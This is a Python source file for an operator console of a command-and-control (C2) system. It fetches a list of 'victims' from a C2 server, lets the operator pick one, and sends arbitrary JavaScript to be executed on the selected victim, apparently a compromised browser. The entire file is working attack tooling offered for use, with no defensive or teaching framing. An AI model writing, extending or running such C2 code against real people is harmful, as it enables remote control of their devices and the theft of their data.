import cmd
import json
import requests
from colorama import Fore, Style, init

init(autoreset=True)

class C2CLI(cmd.Cmd):
    intro = "Advanced C2 CLI - Type 'help' for commands"
    prompt = "C2> "

    def __init__(self):
        super().__init__()
        self.server_url = "http://localhost:5000"
        self.selected_victim = None

    def do_list(self, arg):
        """List all victims"""
        try:
            r = requests.get(f"{self.server_url}/api/victims")
            if r.status_code == 200:
                victims = r.json()
                print("\nNo.  ID                                  Status    Last Seen  ")
                print("-" * 75)
                for idx, v in enumerate(victims, start=1):
                    print(f"{idx:<4} {v['id']:<36}{v['status']:<9}{v['last_seen']}")
                print()
            else:
                print(f"{Fore.RED}✗ Failed to fetch victims: {r.status_code}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {e}{Style.RESET_ALL}")

    def do_select(self, victim_index):
        """Select a victim by list number"""
        if not victim_index.isdigit():
            print(f"{Fore.RED}✗ Invalid victim number{Style.RESET_ALL}")
            return
        try:
            r = requests.get(f"{self.server_url}/api/victims")
            if r.status_code == 200:
                victims = r.json()
                idx = int(victim_index) - 1
                if 0 <= idx < len(victims):
                    self.selected_victim = victims[idx]['id']
                    print(f"{Fore.GREEN}✓ Victim selected: {self.selected_victim}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}✗ Victim number out of range{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ Failed to fetch victims: {r.status_code}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {e}{Style.RESET_ALL}")

    def do_cmd(self, js_code):
        """Execute custom JS command"""
        if not self.selected_victim:
            print(f"{Fore.RED}✗ No victim selected{Style.RESET_ALL}")
            return

        if not js_code:
            print(f"{Fore.RED}✗ Please provide JS code{Style.RESET_ALL}")
            return

        try:
            response = requests.post(
                f"{self.server_url}/api/execute",
                json={
                    'victim_id': self.selected_victim,
                    'command': js_code,
                    'source': 'cmd'
                }
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    print(data)
                except json.JSONDecodeError:
                    print(f"{Fore.YELLOW}✓ Command sent, but no JSON response.{Style.RESET_ALL}")
                    if response.text.strip():
                        print(f"Raw response: {response.text.strip()}")
            else:
                print(f"{Fore.RED}✗ Server returned status: {response.status_code}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}✗ Error sending command: {str(e)}{Style.RESET_ALL}")

    def do_exit(self, arg):
        """Exit the CLI"""
        print("Exiting...")
        return True

if __name__ == "__main__":
    C2CLI().cmdloop()
